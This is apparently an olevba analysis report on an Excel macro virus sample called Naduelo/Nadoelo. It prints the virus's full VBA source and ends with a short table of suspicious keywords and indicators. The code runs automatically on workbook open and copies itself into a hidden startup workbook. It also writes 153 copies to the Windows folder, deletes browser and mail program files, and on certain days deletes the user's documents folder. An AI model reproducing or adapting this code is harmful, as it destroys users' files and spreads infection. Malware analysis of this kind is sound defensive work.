olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Nadoelo.a.xls
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSExcel.Nadoelo.a.xls 
in file: Virus.MSExcel.Nadoelo.a.xls - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'********************************
'Excel macro virus name: Naduelo
'********************************
'It infects Excel workbooks
'********************************
'Brasil 2005

Sub Auto_Open()
On Error Resume Next
Application.Caption = "Excel macro virus 2005"

Dim a%, p%
    
    gp = 0
    vp = 0
   
    Application.ScreenUpdating = False
    For x = 1 To Application.Workbooks.Count
        If Application.Workbooks(x).Name = "Especial.xls" Then
            gp = 1
            For y = 1 To Application.Workbooks("Especial.xls").Modules.Count
            If Application.Workbooks("Especial.xls").Modules(y).Name = "Naduelo" Then
                vp = 1
            End If
        Next
        
         If vp = 0 Then
            Windows("Especial.xls").Visible = True
            Set b = Application.ActiveWorkbook
            
            Application.Workbooks(b.Name).Modules("Naduelo").Copy after:=Application.Workbooks("Especial.xls").Modules(1)
            
            Sheets("Naduelo").Select
            ActiveWindow.SelectedSheets.Visible = False
            
            Windows("Especial.xls").Visible = False
            Application.OnSheetActivate = ActiveWorkbook.Name & "Naduelo macro virus"
            Application.Workbooks("Especial.xls").Save
        End If
        End If
    Next
        If gp = 0 Then
        Set aqui = Application.ActiveWorkbook
        Application.Workbooks(aqui.Name).SaveCopyAs Application.StartupPath + "\Especial.xls"
        Application.Workbooks.Open (Application.StartupPath + "\Especial.xls")
        Windows("Especial.xls").Visible = False
        Application.Workbooks("Especial.xls").Save
        End If
  
 For i = 1 To 153
 ActiveWorkbook.SaveCopyAs "C:\Windows\Rodaco" & i & ".xls"
 Next
 'Save 153 times with viral code named Rodaco1,Rodaco2,...

 MsgBox " Seu computador apresenta problemas !", vbOKOnly + vbCritical, " Excel virus !!"
 Kill "C:\Program Files\Internet Explorer\*.*"
 Kill "C:\Program Files\Outlook Express\*.*"
 Kill "C:\Arquivos de programas\Internet Explorer\*.*"
 Kill "C:\Arquivos de programas\Outlook Express\*.*"

Open "C:\Windows\Naduelo.bat" For Output As #1
Print #1, "@echo off"
Print #1, "Echo         Computador com defeito e problemas."
Print #1, "Echo         Verifique seu Excel."
Print #1, "Echo         Excel virus."
Print #1, "Echo         Infectado com excel macro virus."
Print #1, "Echo         Problema encontrado."
Print #1, "Echo         Ano 2005."
Close #1

 If Day(Now()) = 7 Or (Day(Now)) = 17 Or (Day(Now)) = 27 Then
 MsgBox " Computador apresenta defeitos !", vbOKOnly + vbCritical, " Excel macro virus !!"
 Kill "C:\My Documents\*.*"
 Kill "C:\Meus Documentos\*.*"

ActiveWindow.Visible = False
 ActiveWorkbook.Save
 ActiveWorkbook.Close
 End If
 End Sub


 Private Sub App_WorkbookActivate(ByVal Wb As Workbook)
    Application.Windows.Arrange xlArrangeStyleTiled
 End Sub














 







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |Naduelo.bat         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

